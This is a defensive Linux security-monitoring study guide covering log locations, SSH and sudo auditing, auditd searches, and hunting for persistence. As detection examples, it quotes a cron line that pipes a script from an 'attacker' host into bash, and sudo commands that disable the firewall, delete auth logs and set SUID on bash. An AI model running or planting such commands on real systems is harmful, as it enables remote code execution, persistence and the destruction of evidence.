# Linux Security Monitoring

Linux security monitoring focuses on collecting and analyzing logs, process activity, file changes, authentication events, and command execution to detect compromise.

Linux servers are common targets because they host web applications, databases, cloud workloads, and infrastructure services.

---

## Linux Logging Basics

Linux logs are usually plain text files.

Common location:

```text
/var/log/
```

Typical log format:

```text
Timestamp Hostname Process[PID]: Message
```

Unlike Windows logs, Linux logs usually do not have universal event IDs.

---

## Key Linux Log Files

| File | Purpose |
|---|---|
| `/var/log/syslog` | General system log on Debian/Ubuntu |
| `/var/log/messages` | General system log on RHEL/CentOS |
| `/var/log/auth.log` | Authentication logs on Debian/Ubuntu |
| `/var/log/secure` | Authentication logs on RHEL/CentOS |
| `/var/log/kern.log` | Kernel logs |
| `/var/log/dpkg.log` | Debian package install/removal logs |
| `/var/log/yum.log` | RHEL/CentOS package logs |
| `/var/log/cron` | Scheduled task logs |
| `/var/log/nginx/access.log` | Nginx web access |
| `/var/log/apache2/access.log` | Apache web access |

---

## Working with Logs

Read a log:

```bash
cat /var/log/syslog
```

First lines:

```bash
head /var/log/syslog
```

Last lines:

```bash
tail /var/log/syslog
```

Follow live:

```bash
tail -f /var/log/syslog
```

---

## Filtering with Grep

Filter for a keyword:

```bash
grep "CRON" /var/log/syslog
```

Exclude a keyword:

```bash
grep -v "CRON" /var/log/syslog
```

Recursive search:

```bash
grep -R -E "auth|login|session" /var/log
```

Search compressed rotated logs:

```bash
zgrep "Failed password" /var/log/auth.log*.gz
```

---

## Log Rotation

Logs may rotate into older files.

Examples:

```text
auth.log
auth.log.1
auth.log.2.gz
syslog
syslog.1
syslog.2.gz
```

Use tools like:

```bash
zcat
zgrep
zless
```

---

## Authentication Logs

Authentication logs are critical for detecting:

- SSH brute force
- Successful compromise
- Sudo usage
- User creation
- Group modification
- Password changes
- Privilege escalation attempts

Debian/Ubuntu:

```text
/var/log/auth.log
```

RHEL/CentOS:

```text
/var/log/secure
```

---

## SSH Monitoring

Successful SSH logins:

```bash
grep "sshd" /var/log/auth.log | grep "Accepted"
```

Failed SSH logins:

```bash
grep "sshd" /var/log/auth.log | grep "Failed"
```

Invalid users:

```bash
grep "Invalid user" /var/log/auth.log
```

Brute-force pattern:

```text
Many "Failed password" events from one IP
  -> followed by "Accepted password"
```

---

## Session Events

Find opened and closed sessions:

```bash
grep -E "session opened|session closed" /var/log/auth.log
```

Common sources:

| Source | Meaning |
|---|---|
| `sshd` | Remote SSH login |
| `login` | Local login |
| `sudo` | Elevated command |
| `su` | Switch user |
| `cron` | Scheduled task |

---

## User and Group Changes

Find account changes:

```bash
grep -E "useradd|userdel|usermod|groupadd|groupdel" /var/log/auth.log
```

Red flags:

- Unexpected user creation
- User added to `sudo`
- Root password changed
- Disabled account re-enabled
- Service-looking user created after compromise

---

## Sudo Command Auditing

Sudo logs the command executed.

Search:

```bash
grep "COMMAND=" /var/log/auth.log
```

Suspicious examples:

```text
COMMAND=/usr/bin/systemctl stop ufw
COMMAND=/usr/bin/rm -rf /var/log/auth.log
COMMAND=/usr/bin/chmod +s /bin/bash
```

---

## Web Server Logs

Web logs help detect:

- SQL injection
- Path traversal
- Web shells
- Directory brute forcing
- Authentication attacks
- DoS/DDoS
- Suspicious uploads

Nginx access log example:

```text
10.0.4.99 - - [11/08/2025:17:11:20 +0000] "GET /images/logo.png HTTP/1.1" 200 5432
```

Fields:

| Field | Meaning |
|---|---|
| Source IP | Requester |
| Timestamp | Time of request |
| Method/path | Requested resource |
| Status code | Result |
| Size | Bytes returned |

---

## Bash History

Bash history records interactive commands.

View saved history:

```bash
cat ~/.bash_history
```

View current shell history:

```bash
history
```

Limitations:

- Commands with leading spaces may not be logged.
- Commands inside scripts are not individually logged.
- Attackers can clear history.
- Other shells may not log the same way.
- History writes on session close, not always instantly.

!!! warning
    Bash history is useful but not reliable as a complete forensic record.

---

## Auditd

Auditd is the Linux audit daemon.

It monitors kernel-level activity through syscalls.

Useful for:

- Process execution
- File access
- File modification
- Privileged actions
- Sensitive file monitoring
- Runtime detection
- File integrity monitoring

Audit logs:

```text
/var/log/audit/audit.log
```

---

## Auditd Rules

Rules define what to watch.

Common monitoring targets:

- `/etc/passwd`
- `/etc/shadow`
- `/etc/sudoers`
- `/etc/ssh/sshd_config`
- `/home/*/.ssh/authorized_keys`
- `/etc/crontab`
- `/etc/cron.d/`
- `/etc/systemd/system/`
- `/var/www/`
- Execution of `wget`, `curl`, `nc`, `bash`, `python`

---

## Searching Audit Logs

Use `ausearch`.

Search by key:

```bash
ausearch -i -k proc_wget
```

Search by executable:

```bash
ausearch -i -x wget
```

Search by file:

```bash
ausearch -i -f /etc/ssh/sshd_config
```

Search by PID:

```bash
ausearch -i --pid <PID>
```

Search by parent PID:

```bash
ausearch -i --ppid <PPID>
```

---

## Important Audit Fields

| Field | Meaning |
|---|---|
| `pid` | Process ID |
| `ppid` | Parent process ID |
| `auid` | Original login user |
| `uid` | Effective user |
| `exe` | Executable path |
| `proctitle` | Full command |
| `key` | Rule tag |
| `syscall` | Kernel action |

`auid` is very important because it can preserve the original user even after `sudo`.

---

## Linux Discovery Detection

After gaining access, attackers usually run discovery commands.

Common commands:

| Category | Commands |
|---|---|
| Identity | `whoami`, `id`, `w`, `last` |
| System | `uname -a`, `hostname`, `lsb_release -a`, `env` |
| Users | `cat /etc/passwd`, `cat /etc/sudoers` |
| Processes | `ps aux`, `top` |
| Network | `ip a`, `netstat -tnlp`, `ss -tnlp` |
| Virtualization | `systemd-detect-virt`, `lsmod` |

High-confidence signal:

```text
www-data -> bash -> whoami
```

Web server users rarely need to spawn shells and run discovery commands.

---

## Process Tree Investigation

When investigating suspicious command execution:

1. Find the suspicious child process.
2. Get the parent process ID.
3. Investigate the parent.
4. Investigate sibling processes from the same parent.

Example:

```bash
ausearch -i -x whoami
ausearch -i --pid <PPID>
ausearch -i --ppid <PPID>
```

Suspicious patterns:

```text
/tmp/lp.sh -> whoami
www-data -> bash -> id
apache -> sh -> curl
```

---

## Privilege Escalation Monitoring

Attackers often land as low-privilege users and attempt to become root.

Common phases:

| Phase | Indicators |
|---|---|
| Discovery | `whoami`, `id`, `uname -r` |
| Staging | `wget`, `curl`, files in `/tmp` |
| Compilation | `gcc exploit.c` |
| Execution | Running exploit binary |
| Impact | UID changes to root |

Reliable indicator:

```text
UID changes from normal user to root without legitimate sudo path
```

---

## Privilege Escalation Investigation

Find exploit execution:

```bash
ausearch -i -x pwnkit
```

Trace parent:

```bash
ausearch -i --pid <Exploit_PPID>
```

Trace child:

```bash
ausearch -i --ppid <Exploit_PID>
```

Look for root shell spawned by suspicious process.

---

## Linux Persistence

Common Linux persistence mechanisms:

| Technique | Location |
|---|---|
| Cron job | `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/` |
| Systemd service | `/etc/systemd/system/`, `/lib/systemd/system/` |
| SSH key | `~/.ssh/authorized_keys` |
| New user | `/etc/passwd`, `/etc/shadow` |
| Web shell | `/var/www/`, app upload directories |
| Shell profile | `.bashrc`, `.profile`, `/etc/profile` |

---

## Cron Persistence

Attackers may add jobs like:

```text
@reboot /tmp/payload
*/10 * * * * curl http://attacker/p.sh | bash
```

Hunt:

```bash
ausearch -i -x crontab
ausearch -i -f /etc/crontab
ausearch -i -f /etc/cron.d/
```

---

## Systemd Persistence

Attackers may create fake services.

Suspicious paths:

```text
/etc/systemd/system/*.service
/lib/systemd/system/*.service
```

Hunt:

```bash
ausearch -i -f /etc/systemd/system/
grep -R "ExecStart" /etc/systemd/system/
```

Watch for:

- Odd service names
- Services running from `/tmp`
- Services running curl/bash pipelines
- Newly enabled services
- Masquerading as cloud or update services

---

## Account Persistence

Attackers may create users or add SSH keys.

Find user creation:

```bash
grep -E "useradd|usermod" /var/log/auth.log
```

Check suspicious users:

```bash
cat /etc/passwd
```

Find sudo-capable users:

```bash
getent group sudo
getent group wheel
```

---

## SSH Key Backdoors

Attackers may append their public key to:

```text
~/.ssh/authorized_keys
```

Auditd search:

```bash
ausearch -i -f /home/user/.ssh/authorized_keys
```

Manual hunt:

```bash
find /home -name authorized_keys -type f -exec ls -la {} \;
find /home -name authorized_keys -type f -exec cat {} \;
```

---

## Web Shell Persistence

Web shells provide application-level persistence.

Hunt:

```bash
find /var/www -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" \)
grep -R "system(" /var/www
grep -R "shell_exec" /var/www
grep -R "base64_decode" /var/www
```

Look for:

- New PHP files in upload folders
- Random names
- Double extensions
- Dangerous functions
- Recent modifications

---

## Auditd Alternatives

| Tool | Best For |
|---|---|
| Sysmon for Linux | Teams using Sysmon-style telemetry |
| Falco | Containers and Kubernetes runtime detection |
| Osquery | Querying system state like SQL |
| EDR | Enterprise endpoint detection and response |

---

## Quick Reference

| Goal | Command |
|---|---|
| Successful SSH | `grep "Accepted" /var/log/auth.log` |
| Failed SSH | `grep "Failed password" /var/log/auth.log` |
| Invalid users | `grep "Invalid user" /var/log/auth.log` |
| Sudo commands | `grep "COMMAND=" /var/log/auth.log` |
| User changes | `grep -E "useradd|usermod|userdel" /var/log/auth.log` |
| Search all logs | `grep -R -E "keyword1|keyword2" /var/log` |
| Audit by executable | `ausearch -i -x <binary>` |
| Audit by file | `ausearch -i -f <path>` |
| Audit by key | `ausearch -i -k <key>` |
| Trace parent | `ausearch -i --pid <PPID>` |
| Trace siblings | `ausearch -i --ppid <PPID>` |

---

## Notes to Remember

- Linux logs are mostly plain text.
- `/var/log/auth.log` or `/var/log/secure` is critical for authentication.
- Bash history is helpful but easy to evade.
- Auditd gives syscall-level visibility.
- Process tree context is essential.
- `www-data` running `whoami`, `id`, `bash`, or `curl` is highly suspicious.
- Persistence often uses cron, systemd, SSH keys, new users, or web shells.